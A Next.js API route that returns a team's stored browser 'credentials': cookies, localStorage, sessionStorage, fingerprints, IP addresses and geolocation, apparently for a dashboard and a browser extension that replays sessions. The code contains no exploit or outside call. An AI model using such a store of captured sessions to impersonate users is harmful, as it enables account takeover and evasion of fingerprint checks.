import { NextRequest, NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { credentials, teams } from '@/lib/schema';
import { requireAuth, getUserTeamIds } from '@/lib/auth';
import { eq, and, desc, inArray } from 'drizzle-orm';

export async function GET(request: NextRequest) {
  try {
    const user = await requireAuth(request);
    const userTeamIds = getUserTeamIds(user);
    
    if (userTeamIds.length === 0) {
      return NextResponse.json({ 
        success: false,
        error: 'No team access',
        message: 'User must belong to at least one team',
        data: null
      }, { status: 403 });
    }

    // Get teamId from query parameters
    const { searchParams } = new URL(request.url);
    const teamId = searchParams.get('teamId');

    let teamCredentials;

    if (teamId === 'all') {
      // Return credentials from all user teams with team names (for dashboard)
      teamCredentials = await db.select({
        id: credentials.id,
        teamId: credentials.teamId,
        teamName: teams.name,
        createdAt: credentials.createdAt,
        credentialSource: credentials.credentialSource,
        lastUsedAt: credentials.lastUsedAt,
        ipAddress: credentials.ipAddress,
        userAgent: credentials.userAgent,
        platform: credentials.platform,
        browser: credentials.browser,
        cookies: credentials.cookies,
        localStorage: credentials.localStorage,
        sessionStorage: credentials.sessionStorage,
        fingerprint: credentials.fingerprint,
        geoLocation: credentials.geoLocation,
        isActive: credentials.isActive
      })
        .from(credentials)
        .leftJoin(teams, eq(credentials.teamId, teams.id))
        .where(and(
          inArray(credentials.teamId, userTeamIds),
          eq(credentials.isActive, true)
        ))
        .orderBy(desc(credentials.createdAt));
    } else {
      // Return credentials for specific team (for extension)
      if (!teamId) {
        return NextResponse.json({ 
          success: false,
          error: 'Missing team ID',
          message: 'Team ID is required',
          data: null
        }, { status: 400 });
      }

      if (!userTeamIds.includes(teamId)) {
        return NextResponse.json({ 
          success: false,
          error: 'Team access denied',
          message: 'User does not have access to the specified team',
          data: null
        }, { status: 403 });
      }

      teamCredentials = await db.select({
        id: credentials.id,
        teamId: credentials.teamId,
        teamName: teams.name,
        createdAt: credentials.createdAt,
        credentialSource: credentials.credentialSource,
        lastUsedAt: credentials.lastUsedAt,
        ipAddress: credentials.ipAddress,
        userAgent: credentials.userAgent,
        platform: credentials.platform,
        browser: credentials.browser,
        cookies: credentials.cookies,
        localStorage: credentials.localStorage,
        sessionStorage: credentials.sessionStorage,
        fingerprint: credentials.fingerprint,
        geoLocation: credentials.geoLocation,
        isActive: credentials.isActive
      })
        .from(credentials)
        .leftJoin(teams, eq(credentials.teamId, teams.id))
        .where(and(
          eq(credentials.teamId, teamId),
          eq(credentials.isActive, true)
        ))
        .orderBy(desc(credentials.createdAt));
    }

    // Parse JSON fields for each credential
    const processedCredentials = teamCredentials.map(credential => ({
      ...credential,
      cookies: credential.cookies ? JSON.parse(credential.cookies) : {},
      localStorage: credential.localStorage ? JSON.parse(credential.localStorage) : {},
      sessionStorage: credential.sessionStorage ? JSON.parse(credential.sessionStorage) : {},
      fingerprint: credential.fingerprint ? JSON.parse(credential.fingerprint) : {},
      geoLocation: credential.geoLocation ? JSON.parse(credential.geoLocation) : null,
      browser: credential.browser ? JSON.parse(credential.browser) : null,
    }));

    return NextResponse.json({
      success: true,
      error: null,
      message: 'Credentials retrieved successfully',
      data: {
        credentials: processedCredentials,
        count: processedCredentials.length
      }
    });

  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: 'Server error',
      message: 'Internal server error',
      data: null
    }, { status: 500 });
  }
}
